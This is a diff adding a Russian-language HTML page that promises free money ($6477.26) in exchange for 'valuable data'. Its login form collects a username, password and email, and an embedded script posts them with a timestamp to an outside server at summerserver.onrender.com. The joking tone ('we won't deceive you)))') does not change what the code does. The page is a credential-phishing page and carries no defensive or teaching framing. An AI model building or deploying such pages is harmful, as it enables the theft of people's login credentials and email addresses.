@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Бесплатный заработок</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <h1>Free деньги</h1>
+    <p>
+        Введи свои ценные данные, чтобы получить $6477,26. Не бойся, мы тебя не обманем))
+    </p>
+    <img src="https://i.pinimg.com/originals/3d/1f/3c/3d1f3cf5124ef374647ab3db7aa1f9bb.png" alt="">
+
+    <form action="https://static.wikia.nocookie.net/9743357a-7df6-4dac-89d0-a80cffc7b59c" id="loginForm">
+        <input type="text" name="" id="username" placeholder="Твой драгоценный логин)))">
+        <input type="password" name="" id="password" placeholder="Твой драгоценный пароль)">
+        <input type="email" name="" id="email" placeholder="Твоя драгоценная почта)))">
+        <input type="checkbox" name="" id="">
+
+        <p>Запомнить меня</p>
+        <input type="submit" value="Отправить >:)))))))))">
+    </form>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const data = {
+                username: document.getElementById('username').value,
+                password: document.getElementById('password').value,
+                email: document.getElementById('email').value,
+                date: new Date().toLocaleString()
+            };
+
+            // Отправляем данные на сервер
+            const response = await fetch("http:/summerserver.onrender.com", {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            });
+
+            const result = await response.text();
+            document.body.innerHTML = result;
+        });
+    </script>
+</body>
+</html>
